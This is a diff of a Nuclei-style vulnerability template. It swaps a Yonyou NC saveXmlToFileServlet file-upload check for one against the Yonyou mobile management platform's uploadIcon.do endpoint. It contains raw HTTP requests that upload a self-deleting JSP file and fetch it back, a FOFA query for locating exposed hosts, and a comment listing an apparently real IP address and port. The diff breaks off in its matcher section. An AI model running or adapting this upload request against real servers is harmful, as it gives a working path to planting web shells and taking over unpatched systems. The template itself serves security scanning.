@@ -1,48 +1,60 @@
 id: 2024-105131024
 info:
-  name: 用友NC saveXmlToFIleServlet接口的任意文件上传漏洞
+  name: 用友用友移动管理平台uploadIcon任意文件上传漏洞
   author: k3ppf0r
   severity: critical
   description: |  
-    NC系统可利用saveXmlToFIleServlet接口中的filename参数实现任意文件上传，此漏洞可以给NC服务器预埋后门，从而可以随意操作服务器。
+    用友移动系统管理是用友公司推出的一款移动办公解决方案，旨在帮助企业实现移动办公、提高管理效率和员工工作灵活性。它提供了一系列功能和工具，方便用户在移动设备上管理和处理企业的系统和业务。该产品存在任意文件上传，攻击者可通过此漏洞获取服务器权限。
   reference:
-    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC%E6%8E%A5%E5%8F%A3saveXmlToFIleServlet%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
-    - https://security.yonyou.com/#/noticeInfo?id=533
+    - https://blog.csdn.net/qq_53003652/article/details/135439135
   remediation: |
     打对应补丁，重启服务
   classification:
     cve-id: 2024-105131024
-    cvss-score: 10.0
+    cvss-score: 9.8
     cwe-id: CWE-434
   metadata:
-    date: 2024-03-29
-    version: 用友NC65
-    fofa-query: app="用友-UFIDA-NC"
-  tags: fileupload,rce,ufida,yonyou,nc65
+    date: 2024-01-07
+    version: 用友移动系统
+    fofa-query: app="用友-移动系统管理"
+  tags: fileupload,rce,yonyou
 
-
+# 117.28.239.227:9080
 variables:
   # pay: <% out.println("file not found");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
-  file_name: "{{to_lower(rand_text_alpha(10))}}"
+  file_name: "{{to_lower(rand_text_alpha(10))}}.jsp"
 
 http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename={{file_name}}.jsp%00"
-    headers:
-      Cookie: LA_K1=langid
-      serverEnable: localserver
-      Accept-Encoding: gzip, x-gzip, deflate
-      Content-Length: 27
-      Content-Type: application/octet-stream
-      Content-Encoding: UTF_8
-      Connection: keep-alive
-      User-Agent: Apache-HttpClient/5.2.1 (Java/1.8.0_202)
-    body: '{{randstr_1}}'
+  - raw:
+      - |
+        POST /maportal/appmanager/uploadIcon.do HTTP/2
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Sec-Ch-Ua-Platform: "macOS"
+        Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: no-cors
+        Sec-Fetch-Dest: image
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryh1ZETbVA73oQbnyE
+        Content-Length: 268
+
+        ------WebKitFormBoundaryh1ZETbVA73oQbnyE
+        Content-Disposition: form-data; name="iconFile";filename="{{file_name}}"
+
+        <%
+        out.println("{{randstr_1}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();
+        %>
+        ------WebKitFormBoundaryh1ZETbVA73oQbnyE--
 
   - method: GET
     path:
-      - "{{BaseURL}}/portal/processxml/{{file_name}}.jsp"
+      - "{{BaseURL}}/maupload/img/{{file_name}}"
     matchers:
       - type: word
         words:
